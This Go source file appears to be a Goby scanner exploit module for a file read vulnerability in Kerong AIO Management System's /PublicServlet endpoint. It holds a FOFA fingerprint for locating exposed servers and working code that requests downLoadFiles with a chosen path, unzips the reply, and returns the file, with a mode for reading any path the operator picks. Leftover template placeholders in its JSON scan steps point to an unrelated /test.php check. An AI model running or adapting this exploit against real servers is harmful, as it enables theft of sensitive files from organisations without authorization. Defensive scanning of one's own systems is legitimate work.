package exploits

import (
	"archive/zip"
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Cooperation-AIO-MS /PublicServlet  File Read Vulnerability",
    "Description": "<p>Kerong AIO Management System is a comprehensive enterprise management software, which aims to provide comprehensive management solutions for enterprises. The system integrates a variety of functional modules, including but not limited to human resource management, financial management, supply chain management, customer relationship management, etc., to help enterprises efficiently manage all aspects of business activities.</p><p>There is a file reading vulnerability in the CORONG AIO management system, in which an attacker enters the file path to download the file, which may lead to the leakage of sensitive system information and cause serious security risks.</p>",
    "Product": "Cooperation-AIO-MS",
    "Homepage": "http://www.koronsoft.com/",
    "DisclosureDate": "2024-05-18",
    "PostTime": "2024-05-20",
    "Author": "2974057526@qq.com",
    "FofaQuery": "body=\"changeAccount('8000')\"",
    "GobyQuery": "body=\"changeAccount('8000')\"",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in the CORONG AIO management system, in which an attacker enters the file path to download the file, which may lead to the leakage of sensitive system information and cause serious security risks.</p>",
    "Recommendation": "<p>1. Input validation: Ensure strict validation of user input, allowing only specific characters and formats. Avoid using user input to construct file paths, or whitelists to restrict user access to specific files.  </p><p> 2. Access control: Implement appropriate access control mechanisms to ensure that only authorized users can access specific files. Use role-based access control (RBAC) or access control lists (ACLs) to manage access to files.  </p><p> 3. File permissions: On the server, make sure that the permissions of the files are set correctly to prevent unauthorized reading. Application files that do not need to be executed can be set to be read only by the application user.  </p><p> 4. Directory restrictions: Restrict applications from only accessing specific directories, and avoid allowing applications to access system files or other sensitive directories. Secure coding practices: Follow secure coding practices, such as using secure APIs when working with files and avoiding functions that may have security issues.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,win.ini",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/WIndows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "科荣AIO管理系统 /PublicServlet 文件读取漏洞",
            "Product": "科荣AIO管理系统",
            "Description": "<p>科荣AIO管理系统是一款综合性的企业管理软件，旨在为企业提供全面的管理解决方案。该系统整合了多种功能模块，包括但不限于人力资源管理、财务管理、供应链管理、客户关系管理等，以帮助企业高效地管理各个方面的业务活动。<br></p><p>科荣AIO管理系统存在文件读取漏洞，攻击者输入文件路径下载文件，这可能导致系统敏感信息泄露，造成严重的安全风险。<br></p>",
            "Recommendation": "<p>1、输入验证：确保对用户输入进行严格的验证，只允许特定的字符和格式。避免使用用户输入来构造文件路径，或者使用白名单来限制用户只能访问特定的文件。&nbsp;</p><p>2、访问控制：实施适当的访问控制机制，确保只有授权用户才能访问特定的文件。使用基于角色的访问控制（RBAC）或访问控制列表（ACL）来管理文件的访问权限。&nbsp;</p><p>3、文件权限：在服务器上，确保文件的权限设置正确，以防止未授权的读取。对于不需要执行的应用程序文件，可以设置为只有应用程序用户才能读取。&nbsp;</p><p>4、目录限制：限制应用程序只能访问特定的目录，避免让应用程序访问系统文件或其他敏感目录。安全编码实践：遵循安全编码实践，如在处理文件时使用安全的API，避免使用可能存在安全问题的函数。<br></p>",
            "Impact": "<p>科荣AIO管理系统存在文件读取漏洞，攻击者输入文件路径下载文件，这可能导致系统敏感信息泄露，造成严重的安全风险。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Cooperation-AIO-MS /PublicServlet  File Read Vulnerability",
            "Product": "Cooperation-AIO-MS",
            "Description": "<p>Kerong AIO Management System is a comprehensive enterprise management software, which aims to provide comprehensive management solutions for enterprises. The system integrates a variety of functional modules, including but not limited to human resource management, financial management, supply chain management, customer relationship management, etc., to help enterprises efficiently manage all aspects of business activities.<br></p><p>There is a file reading vulnerability in the CORONG AIO management system, in which an attacker enters the file path to download the file, which may lead to the leakage of sensitive system information and cause serious security risks.<br></p>",
            "Recommendation": "<p>1. Input validation: Ensure strict validation of user input, allowing only specific characters and formats. Avoid using user input to construct file paths, or whitelists to restrict user access to specific files.&nbsp;&nbsp;</p><p>&nbsp;2. Access control: Implement appropriate access control mechanisms to ensure that only authorized users can access specific files. Use role-based access control (RBAC) or access control lists (ACLs) to manage access to files.&nbsp;&nbsp;</p><p>&nbsp;3. File permissions: On the server, make sure that the permissions of the files are set correctly to prevent unauthorized reading. Application files that do not need to be executed can be set to be read only by the application user.&nbsp;&nbsp;</p><p>&nbsp;4. Directory restrictions: Restrict applications from only accessing specific directories, and avoid allowing applications to access system files or other sensitive directories. Secure coding practices: Follow secure coding practices, such as using secure APIs when working with files and avoiding functions that may have security issues.<br></p>",
            "Impact": "<p>There is a file reading vulnerability in the CORONG AIO management system, in which an attacker enters the file path to download the file, which may lead to the leakage of sensitive system information and cause serious security risks.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	postOrGet_AAAAA1716021141 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		readzip := func(content []byte) string {
			r := bytes.NewReader(content)
			zr, err := zip.NewReader(r, int64(len(content)))
			if err != nil {
				return ""
			}
			for _, f := range zr.File {
				rc, err := f.Open()
				if err != nil {
					return ""
				}
				defer rc.Close()
				data, err := io.ReadAll(rc)
				if err != nil {
					return ""
				}
				return string(data)
			}
			return ""
		}

		var respTxt string
		client := &http.Client{}
		// 构建完整的请求URL
		requestUrl := hostInfo.FixedHostInfo + "/PublicServlet?operation=downLoadFiles&path=" + fileUrl + "&pho="
		// 解析URL以确保其有效性
		parsedUrl, err := url.Parse(requestUrl)
		if err != nil {
			return respTxt, err
		}
		// 创建HTTP请求
		req, err := http.NewRequest("GET", parsedUrl.String(), nil)
		if err != nil {
			return respTxt, err
		}
		// 设置请求头部
		resp, err := client.Do(req)
		if err != nil {
			return respTxt, err
		}
		defer resp.Body.Close()

		bodyText, err := io.ReadAll(resp.Body)
		if err != nil {
			return respTxt, err
		}

		return readzip(bodyText), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/PublicServlet?operation=downLoadFiles&path="
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:/Windows/win.ini": "for 16-bit app support",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA1716021141

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"C:/Windows/win.ini", "for 16-bit app support"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA1716021141

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
